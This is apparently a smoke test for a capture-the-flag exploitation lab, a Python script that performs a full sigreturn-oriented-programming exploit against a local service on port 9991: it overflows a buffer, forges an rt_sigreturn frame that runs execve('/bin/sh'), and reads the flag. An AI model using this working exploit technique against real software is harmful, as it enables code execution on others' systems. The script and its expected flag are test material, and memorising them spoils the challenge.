#!/usr/bin/env python3
"""Smoke test for srop-001 (port 9991): Sigreturn Oriented Programming,
no-PIE.

The banner hands the two anchors: the sigreturn gadget
(mov rax, 15; syscall) and the "/bin/sh" string. The exploit returns
INTO the gadget body (gadget + 4: past the push rbp; mov rsp,rbp
prologue so rsp stays put), rax=15 fires, and the kernel restores the
WHOLE register state from the forged rt_sigreturn frame at rsp.

Frame layout (kernel struct sigcontext_64 order, uc header 0x28):
  P+0x00 uc_flags  P+0x08 &uc  P+0x10 uc_stack(24)
  P+0x28 r8..r15   P+0x68 rdi  P+0x70 rsi  P+0x78 rbp  P+0x80 rbx
  P+0x88 rdx       P+0x90 rax  P+0x98 rcx  P+0xA0 rsp  P+0xA8 rip
  P+0xB0 eflags    P+0xB8 cs/gs  P+0xBC fs/ss  P+0xC0 err  P+0xC8 trapno
  ... fpstate=0, reserved, sigmask zeroed.

The frame sets rax=59 (execve), rdi="/bin/sh", rsi=rdx=0, and
rip = gadget + 11 (the syscall instruction: mov $15,%rax is 5 bytes,
syscall lands at gadget+11 after the 8-byte prologue... measured in
the container: mov $0xf,%rax at gadget+4, syscall at gadget+11).

main() NULs the last read byte (input[n - 1] = 0): the frame's tail is
zeroed reserved/mask words, the NUL lands there harmlessly.

Success output (the shell cats the flag file):

  FLAG{mr5_srop_sigreturn_frame}
"""

import re
import socket
import struct
import time

HOST = "127.0.0.1"
PORT = 9991

PAD = 16  # small[8] + saved rbp

p64 = lambda x: struct.pack("<Q", x & (2**64 - 1))


def recv_until(s, needle, limit=65536):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def build_frame(sh_addr, syscall_addr, rsp_addr):
    """The forged rt_sigreturn frame: uc header (0x28) + sigcontext."""
    f = b""
    f += p64(0)  # uc_flags (no UC_SIGCONTEXT_SS: strict SS restore, fine)
    f += p64(0)  # &uc (the kernel does not dereference it)
    f += p64(0) * 3  # uc_stack (ss_sp, ss_flags+pad, ss_size)
    # sigcontext: r8 r9 r10 r11 r12 r13 r14 r15 (zeroed)
    f += p64(0) * 8
    f += p64(sh_addr)  # rdi = "/bin/sh"
    f += p64(0)  # rsi = argv = NULL
    f += p64(0)  # rbp
    f += p64(0)  # rbx
    f += p64(0)  # rdx = envp = NULL
    f += p64(59)  # rax = SYS_execve
    f += p64(0)  # rcx
    f += p64(rsp_addr)  # rsp (the shell's stack)
    f += p64(syscall_addr)  # rip = the syscall inside the gadget
    f += p64(0x202)  # eflags (IF set)
    f += struct.pack("<IHHH", 0x33, 0, 0, 0x2B)  # cs, gs, fs, ss
    f += p64(0) * 5  # err, trapno, oldmask, cr2, fpstate=0
    f += p64(0) * 7  # reserved1
    f += p64(0) * 8  # sigmask
    return f


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # the banner: the gadget and the "/bin/sh" string
    banner = recv_until(s, b"name? ")
    m = re.search(rb"gadget\(\) at 0x([0-9a-f]+) sh\(\) at 0x([0-9a-f]+)", banner)
    assert m, f"no gadget addresses in banner: {banner[:120]!r}"
    gadget, sh = int(m.group(1), 16), int(m.group(2), 16)
    print(f"[+] gadget={gadget:#x} (body+4={gadget + 4:#x}) sh={sh:#x}")

    # the frame: ret into gadget+4 (past the prologue), rax=15 fires,
    # the kernel restores the forged frame (execve("/bin/sh"))
    frame_base = 0x700000000000  # the restored rsp (dummy: execve ignores it)
    frame = build_frame(sh, gadget + 0xB, frame_base)
    payload = b"A" * PAD + p64(gadget + 4) + frame
    print(f"[+] payload {len(payload)} bytes")
    s.send(payload)
    time.sleep(0.5)  # the read consumes ONLY the payload: the shell's
    # stdin stays clean for the command

    # the shell: cat the flag file (the service's cwd)
    s.send(b"cat srop-001.flag\n")
    out = b""
    s.settimeout(5)
    try:
        while b"FLAG{" not in out:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    print(f"[+] shell output: {out.strip()[-60:]!r}")
    assert b"FLAG{mr5_srop_sigreturn_frame}" in out, "oracle flag missing"
    print("[+] srop-001 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
